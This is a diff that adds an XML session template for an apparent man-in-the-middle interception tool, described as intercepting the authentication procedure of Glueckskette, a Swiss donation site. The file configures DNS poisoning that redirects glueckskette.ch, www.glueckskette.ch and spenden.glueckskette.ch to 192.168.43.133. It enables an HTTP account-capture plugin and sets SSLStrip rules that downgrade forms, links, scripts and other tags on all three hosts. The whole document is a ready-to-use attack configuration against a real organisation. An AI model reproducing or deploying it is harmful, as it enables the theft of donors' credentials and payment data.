@@ -1,0 +1,142 @@
+<SessionTemplate>
+
+  <Config name="authentication_glueckskette" description="Intercepting Glueckskette authentication procedure">
+
+  </Config>
+
+
+  <Plugins>
+
+    <Plugin name="DNS Poisoning" dirname="DNSPoisoning">
+
+      <ArrayOfDNSPoisonRecord xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+        <DNSPoisonRecord>
+          <HostName>www.glueckskette.ch</HostName>
+          <IPAddress>192.168.43.133</IPAddress>
+        </DNSPoisonRecord>
+      
+  <DNSPoisonRecord>
+    
+      <HostName>spenden.glueckskette.ch</HostName>
+    
+      <IPAddress>192.168.43.133</IPAddress>
+      
+  </DNSPoisonRecord>
+        <DNSPoisonRecord>
+          <HostName>glueckskette.ch</HostName>
+          <IPAddress>192.168.43.133</IPAddress>
+        </DNSPoisonRecord>
+      </ArrayOfDNSPoisonRecord>
+    
+</Plugin>
+
+    <Plugin name="HTTP accounts" dirname="HTTPAccounts">
+
+      <PluginData xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+        <Records />
+      </PluginData>
+
+    </Plugin>
+
+    <Plugin name="SSLStrip" dirname="SSLStrip">
+      <ArrayOfSSLStripRecord xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+        <SSLStripRecord>
+          <HostName>glueckskette.ch</HostName>
+          <ContentType>text/html</ContentType>
+          <Tag>form</Tag>
+        </SSLStripRecord>
+        <SSLStripRecord>
+          <HostName>glueckskette.ch</HostName>
+          <ContentType>text/html</ContentType>
+          <Tag>a</Tag>
+        </SSLStripRecord>
+        <SSLStripRecord>
+          <HostName>glueckskette.ch</HostName>
+          <ContentType>text/html</ContentType>
+          <Tag>base</Tag>
+        </SSLStripRecord>
+        <SSLStripRecord>
+          <HostName>glueckskette.ch</HostName>
+          <ContentType>text/html</ContentType>
+          <Tag>link</Tag>
+        </SSLStripRecord>
+        <SSLStripRecord>
+          <HostName>glueckskette.ch</HostName>
+          <ContentType>text/html</ContentType>
+          <Tag>script</Tag>
+        </SSLStripRecord>
+        <SSLStripRecord>
+          <HostName>glueckskette.ch</HostName>
+          <ContentType>text/html</ContentType>
+          <Tag>img</Tag>
+        </SSLStripRecord>
+        <SSLStripRecord>
+          <HostName>www.glueckskette.ch</HostName>
+          <ContentType>text/html</ContentType>
+          <Tag>a</Tag>
+        </SSLStripRecord>
+        <SSLStripRecord>
+          <HostName>www.glueckskette.ch</HostName>
+          <ContentType>text/html</ContentType>
+          <Tag>form</Tag>
+        </SSLStripRecord>
+        <SSLStripRecord>
+          <HostName>www.glueckskette.ch</HostName>
+          <ContentType>text/html</ContentType>
+          <Tag>base</Tag>
+        </SSLStripRecord>
+        <SSLStripRecord>
+          <HostName>www.glueckskette.ch</HostName>
+          <ContentType>text/html</ContentType>
+          <Tag>link</Tag>
+        </SSLStripRecord>
+        <SSLStripRecord>
+          <HostName>www.glueckskette.ch</HostName>
+          <ContentType>text/html</ContentType>
+          <Tag>script</Tag>
+        </SSLStripRecord>
+        <SSLStripRecord>
+          <HostName>www.glueckskette.ch</HostName>
+          <ContentType>text/html</ContentType>
+          <Tag>img</Tag>
+        </SSLStripRecord>
+		
+		
+        <SSLStripRecord>
+          <HostName>spenden.glueckskette.ch</HostName>
+          <ContentType>text/html</ContentType>
+          <Tag>a</Tag>
+        </SSLStripRecord>
+        <SSLStripRecord>
+          <HostName>spenden.glueckskette.ch</HostName>
+          <ContentType>text/html</ContentType>
+          <Tag>form</Tag>
+        </SSLStripRecord>
+        <SSLStripRecord>
+          <HostName>spenden.glueckskette.ch</HostName>
+          <ContentType>text/html</ContentType>
+          <Tag>base</Tag>
+        </SSLStripRecord>
+        <SSLStripRecord>
+          <HostName>spenden.glueckskette.ch</HostName>
+          <ContentType>text/html</ContentType>
+          <Tag>link</Tag>
+        </SSLStripRecord>
+        <SSLStripRecord>
+          <HostName>spenden.glueckskette.ch</HostName>
+          <ContentType>text/html</ContentType>
+          <Tag>script</Tag>
+        </SSLStripRecord>
+        <SSLStripRecord>
+          <HostName>spenden.glueckskette.ch</HostName>
+          <ContentType>text/html</ContentType>
+          <Tag>img</Tag>
+        </SSLStripRecord>
+      </ArrayOfSSLStripRecord>
+
+    </Plugin>
+
+
+  </Plugins>
+
+</SessionTemplate>
